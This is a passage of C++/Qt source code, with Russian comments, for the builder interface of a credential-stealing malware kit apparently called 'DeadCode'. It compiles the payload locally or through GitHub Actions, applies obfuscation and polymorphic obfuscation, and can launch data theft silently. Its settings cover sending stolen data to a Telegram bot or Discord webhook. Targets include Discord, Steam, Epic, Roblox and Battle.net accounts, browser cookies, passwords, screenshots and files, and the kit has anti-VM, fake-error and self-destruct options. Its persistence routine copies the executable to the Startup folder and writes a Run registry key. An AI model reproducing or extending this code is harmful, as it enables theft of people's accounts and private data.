    QString tempDir = QString::fromStdString("temp_" + generateRandomString(8));
    QThread* thread = new QThread(this);
    StealerWorker* worker = new StealerWorker(this, tempDir.toStdString());
    worker->moveToThread(thread);

    connect(thread, &QThread::started, worker, &StealerWorker::process);
    connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
}

// Запуск GitHub Actions Workflow
void MainWindow::triggerGitHubActions() {
    emitLog("Запуск GitHub Actions Workflow...");

    QString githubToken = githubTokenLineEdit->text();
    QString githubRepo = githubRepoLineEdit->text();

    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: Токен GitHub или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    QString url = "https://api.github.com/repos/" + githubRepo + "/actions/workflows/build.yml/dispatches";
    QNetworkRequest request(QUrl(url));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main"; // Ветка, на которой запускается workflow

    QJsonDocument doc(json);
    QByteArray data = doc.toJson();

    QNetworkReply* reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            emitLog("Ошибка при запуске GitHub Actions: " + reply->errorString());
            isBuilding = false;
        } else {
            emitLog("GitHub Actions Workflow успешно запущен");
            statusCheckTimer->start(30000); // Проверяем статус каждые 30 секунд
        }
        reply->deleteLater();
    });
}

// Проверка статуса сборки в GitHub Actions
void MainWindow::checkBuildStatus() {
    QString githubToken = githubTokenLineEdit->text();
    QString githubRepo = githubRepoLineEdit->text();

    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: Токен GitHub или репозиторий не указаны");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QString url = "https://api.github.com/repos/" + githubRepo + "/actions/runs";
    QNetworkRequest request(QUrl(url));
    request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply* reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            emitLog("Ошибка при проверке статуса сборки: " + reply->errorString());
            statusCheckTimer->stop();
            isBuilding = false;
        } else {
            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = doc.object();
            QJsonArray runs = obj["workflow_runs"].toArray();
            if (runs.isEmpty()) {
                emitLog("Не найдено активных запусков GitHub Actions");
                return;
            }

            QJsonObject latestRun = runs[0].toObject();
            QString status = latestRun["status"].toString();
            QString conclusion = latestRun["conclusion"].toString();
            runId = latestRun["id"].toInt();

            emitLog("Статус сборки: " + status + ", Заключение: " + (conclusion.isEmpty() ? "в процессе" : conclusion));

            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emitLog("Сборка успешно завершена, загрузка артефактов...");
                    downloadArtifacts();
                } else {
                    emitLog("Сборка завершилась с ошибкой: " + conclusion);
                    isBuilding = false;
                }
            }
        }
        reply->deleteLater();
    });
}

// Загрузка артефактов из GitHub Actions
void MainWindow::downloadArtifacts() {
    QString githubToken = githubTokenLineEdit->text();
    QString githubRepo = githubRepoLineEdit->text();

    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: Токен GitHub или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    QString url = "https://api.github.com/repos/" + githubRepo + "/actions/runs/" + QString::number(runId) + "/artifacts";
    QNetworkRequest request(QUrl(url));
    request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply* reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            emitLog("Ошибка при получении артефактов: " + reply->errorString());
            isBuilding = false;
        } else {
            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = doc.object();
            QJsonArray artifacts = obj["artifacts"].toArray();
            if (artifacts.isEmpty()) {
                emitLog("Артефакты не найдены");
                isBuilding = false;
                return;
            }

            QJsonObject artifact = artifacts[0].toObject();
            QString downloadUrl = artifact["archive_download_url"].toString();
            artifactId = artifact["id"].toInt();

            QNetworkRequest downloadRequest(QUrl(downloadUrl));
            downloadRequest.setRawHeader("Authorization", ("Bearer " + githubTokenLineEdit->text()).toUtf8());
            downloadRequest.setRawHeader("Accept", "application/vnd.github.v3+json");

            QNetworkReply* downloadReply = manager->get(downloadRequest);
            connect(downloadReply, &QNetworkReply::finished, this, [this, downloadReply]() {
                if (downloadReply->error() != QNetworkReply::NoError) {
                    emitLog("Ошибка при загрузке артефакта: " + downloadReply->errorString());
                } else {
                    QByteArray data = downloadReply->readAll();
                    QString outputFile = QString::fromStdString(config.filename);
                    if (outputFile.isEmpty()) {
                        outputFile = "DeadCode.exe";
                    }
                    QFile file(outputFile);
                    if (file.open(QIODevice::WriteOnly)) {
                        file.write(data);
                        file.close();
                        emitLog("Артефакт успешно загружен: " + outputFile);

                        std::string exePath = outputFile.toStdString();
                        obfuscateExecutable(exePath);
                        applyPolymorphicObfuscation(exePath);

                        if (config.silent) {
                            emitLog("Запуск процесса кражи данных в фоновом режиме...");
                            emit startStealSignal();
                        }
                    } else {
                        emitLog("Ошибка: Не удалось сохранить артефакт");
                    }
                }
                downloadReply->deleteLater();
                isBuilding = false;
            });
        }
        reply->deleteLater();
    });
}

// Копирование иконки в директорию сборки
void MainWindow::copyIconToBuild() {
    if (config.iconPath.empty()) {
        emitLog("Иконка не указана, пропускаем копирование...");
        return;
    }

    std::string destIconPath = "builds/icon.ico";
    try {
        std::filesystem::copy_file(config.iconPath, destIconPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Иконка скопирована в директорию сборки: " + QString::fromStdString(destIconPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка при копировании иконки: " + QString::fromStdString(e.what()));
    }
}

// Сборка исполняемого файла (обновлено: добавлена поддержка GitHub Actions)
void MainWindow::buildExecutable() {
    if (isBuilding) {
        emitLog("Сборка уже выполняется, пожалуйста, подождите...");
        return;
    }

    isBuilding = true;
    emitLog("Начало сборки исполняемого файла...");

    updateConfigFromUI();
    generateEncryptionKeys();
    generatePolymorphicCode();
    generateJunkCode();
    generateBuildKeyHeader();

    if (config.buildMethod == "GitHub Actions") {
        triggerGitHubActions();
        return; // Ожидаем завершения сборки через GitHub Actions
    }

    if (!std::filesystem::exists("main.cpp")) {
        emitLog("Ошибка: Файл main.cpp не найден. Убедитесь, что он существует в текущей директории.");
        isBuilding = false;
        return;
    }

    QString outputFile = QString::fromStdString(config.filename);
    if (outputFile.isEmpty()) {
        outputFile = "DeadCode.exe";
    }

    QString command = "g++ -o \"" + outputFile + "\" main.cpp -lbcrypt -lshlwapi -liphlpapi -lpsapi -luser32 -lwininet -ladvapi32 -lws2_32 -lcrypt32 -lzip -lsqlite3 -lcurl -lssl -lcrypto";
    if (!config.iconPath.empty()) {
        command += " -mwindows -I. -L. -I./include -L./lib \"" + QString::fromStdString(config.iconPath) + "\"";
    } else {
        command += " -mwindows -I. -L. -I./include -L./lib";
    }

    QProcess process;
    process.start(command);
    process.waitForFinished(-1);

    if (process.exitCode() != 0) {
        emitLog("Ошибка компиляции: " + QString::fromUtf8(process.readAllStandardError()));
        isBuilding = false;
        return;
    }

    emitLog("Исполняемый файл успешно скомпилирован: " + outputFile);

    std::string exePath = outputFile.toStdString();
    obfuscateExecutable(exePath);
    applyPolymorphicObfuscation(exePath);

    emitLog("Сборка завершена: " + outputFile);
    isBuilding = false;

    if (config.silent) {
        emitLog("Запуск процесса кражи данных в фоновом режиме...");
        emit startStealSignal();
    }
}

// Обработчик нажатия кнопки "Собрать"
void MainWindow::on_buildButton_clicked() {
    if (isBuilding) {
        emitLog("Сборка уже выполняется, пожалуйста, подождите...");
        return;
    }

    buildExecutable();
}

// Обработчик нажатия кнопки выбора иконки
void MainWindow::on_iconBrowseButton_clicked() {
    QString iconPath = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
    if (!iconPath.isEmpty()) {
        iconPathLineEdit->setText(iconPath);
        config.iconPath = iconPath.toStdString();
        emitLog("Иконка выбрана: " + iconPath);
    }
}

// Обработчик нажатия кнопки очистки логов
void MainWindow::on_clearLogsButton_clicked() {
    textEdit->clear();
    emitLog("Логи очищены");
}

// Сохранение конфигурации (обновлено: убраны устаревшие поля)
void MainWindow::saveConfig() {
    updateConfigFromUI();
    QString filePath = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.json)");
    if (filePath.isEmpty()) return;

    QJsonObject configObj;
    configObj["sendMethod"] = QString::fromStdString(config.sendMethod);
    configObj["buildMethod"] = QString::fromStdString(config.buildMethod);
    configObj["telegramBotToken"] = QString::fromStdString(config.telegramBotToken);
    configObj["telegramChatId"] = QString::fromStdString(config.telegramChatId);
    configObj["discordWebhook"] = QString::fromStdString(config.discordWebhook);
    configObj["filename"] = QString::fromStdString(config.filename);
    configObj["iconPath"] = QString::fromStdString(config.iconPath);
    configObj["discord"] = config.discord;
    configObj["steam"] = config.steam;
    configObj["steamMAFile"] = config.steamMAFile;
    configObj["epic"] = config.epic;
    configObj["roblox"] = config.roblox;
    configObj["battlenet"] = config.battlenet;
    configObj["minecraft"] = config.minecraft;
    configObj["cookies"] = config.cookies;
    configObj["passwords"] = config.passwords;
    configObj["screenshot"] = config.screenshot;
    configObj["fileGrabber"] = config.fileGrabber;
    configObj["systemInfo"] = config.systemInfo;
    configObj["socialEngineering"] = config.socialEngineering;
    configObj["chatHistory"] = config.chatHistory;
    configObj["telegram"] = config.telegram;
    configObj["antiVM"] = config.antiVM;
    configObj["fakeError"] = config.fakeError;
    configObj["silent"] = config.silent;
    configObj["autoStart"] = config.autoStart;
    configObj["persist"] = config.persist;
    configObj["selfDestruct"] = config.selfDestruct;

    QJsonDocument doc(configObj);
    QFile file(filePath);
    if (file.open(QIODevice::WriteOnly)) {
        file.write(doc.toJson());
        file.close();
        emitLog("Конфигурация сохранена: " + filePath);
    } else {
        emitLog("Ошибка: Не удалось сохранить конфигурацию");
    }
}

// Загрузка конфигурации (обновлено: убраны устаревшие поля)
void MainWindow::loadConfig() {
    QString filePath = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.json)");
    if (filePath.isEmpty()) return;

    QFile file(filePath);
    if (!file.open(QIODevice::ReadOnly)) {
        emitLog("Ошибка: Не удалось открыть файл конфигурации");
        return;
    }

    QByteArray data = file.readAll();
    file.close();

    QJsonDocument doc = QJsonDocument::fromJson(data);
    if (doc.isNull()) {
        emitLog("Ошибка: Неверный формат файла конфигурации");
        return;
    }

    QJsonObject configObj = doc.object();
    sendMethodComboBox->setCurrentText(configObj["sendMethod"].toString());
    buildMethodComboBox->setCurrentText(configObj["buildMethod"].toString());
    tokenLineEdit->setText(configObj["telegramBotToken"].toString());
    chatIdLineEdit->setText(configObj["telegramChatId"].toString());
    discordWebhookLineEdit->setText(configObj["discordWebhook"].toString());
    fileNameLineEdit->setText(configObj["filename"].toString());
    iconPathLineEdit->setText(configObj["iconPath"].toString());
    discordCheckBox->setChecked(configObj["discord"].toBool());
    steamCheckBox->setChecked(configObj["steam"].toBool());
    steamMAFileCheckBox->setChecked(configObj["steamMAFile"].toBool());
    epicCheckBox->setChecked(configObj["epic"].toBool());
    robloxCheckBox->setChecked(configObj["roblox"].toBool());
    battlenetCheckBox->setChecked(configObj["battlenet"].toBool());
    minecraftCheckBox->setChecked(configObj["minecraft"].toBool());
    cookiesCheckBox->setChecked(configObj["cookies"].toBool());
    passwordsCheckBox->setChecked(configObj["passwords"].toBool());
    screenshotCheckBox->setChecked(configObj["screenshot"].toBool());
    fileGrabberCheckBox->setChecked(configObj["fileGrabber"].toBool());
    systemInfoCheckBox->setChecked(configObj["systemInfo"].toBool());
    socialEngineeringCheckBox->setChecked(configObj["socialEngineering"].toBool());
    chatHistoryCheckBox->setChecked(configObj["chatHistory"].toBool());
    telegramCheckBox->setChecked(configObj["telegram"].toBool());
    antiVMCheckBox->setChecked(configObj["antiVM"].toBool());
    fakeErrorCheckBox->setChecked(configObj["fakeError"].toBool());
    silentCheckBox->setChecked(configObj["silent"].toBool());
    autoStartCheckBox->setChecked(configObj["autoStart"].toBool());
    persistCheckBox->setChecked(configObj["persist"].toBool());
    selfDestructCheckBox->setChecked(configObj["selfDestruct"].toBool());

    updateConfigFromUI();
    emitLog("Конфигурация загружена: " + filePath);
}

// Экспорт логов
void MainWindow::exportLogs() {
    QString filePath = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
    if (filePath.isEmpty()) return;

    QFile file(filePath);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << textEdit->toPlainText();
        file.close();
        emitLog("Логи экспортированы: " + filePath);
    } else {
        emitLog("Ошибка: Не удалось экспортировать логи");
    }
}

// Обработчик ответа от сервера
void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() != QNetworkReply::NoError) {
        emitLog("Ошибка сети: " + reply->errorString());
    } else {
        emitLog("Ответ от сервера получен: " + QString::fromUtf8(reply->readAll()));
    }
    reply->deleteLater();
}

// Добавление лога в текстовое поле
void MainWindow::appendLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    textEdit->append(message);
    textEdit->verticalScrollBar()->setValue(textEdit->verticalScrollBar()->maximum());
}

// Добавляем метод setupPersistence здесь
void MainWindow::setupPersistence() {
    if (!config.autoStart && !config.persist) {
        return;
    }

    emitLog("Настройка персистентности и автозагрузки...");

    // Получаем путь к текущему исполняемому файлу
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string currentExePath = exePath;

    // Путь для персистентного файла
    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для персистентности");
        free(appDataPath);
        return;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string persistDir = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    std::string persistPath = persistDir + "\\" + config.filename;

    try {
        std::filesystem::create_directories(persistDir);
        if (config.persist) {
            std::filesystem::copy_file(currentExePath, persistPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Файл скопирован для персистентности: " + QString::fromStdString(persistPath));
        }
    } catch (const std::exception& e) {
        emitLog("Ошибка при копировании файла для персистентности: " + QString::fromStdString(e.what()));
        return;
    }

    if (config.autoStart) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            std::string appName = "DeadCode";
            if (RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)persistPath.c_str(), persistPath.length() + 1) == ERROR_SUCCESS) {
                emitLog("Программа добавлена в автозагрузку через реестр");
            } else {
                emitLog("Ошибка: Не удалось добавить программу в автозагрузку через реестр");
            }
            RegCloseKey(hKey);
        } else {
            emitLog("Ошибка: Не удалось открыть ключ реестра для автозагрузки");
        }
    }

    emitLog("Настройка персистентности и автозагрузки завершена");
}

} // Закрывающая скобка класса MainWindow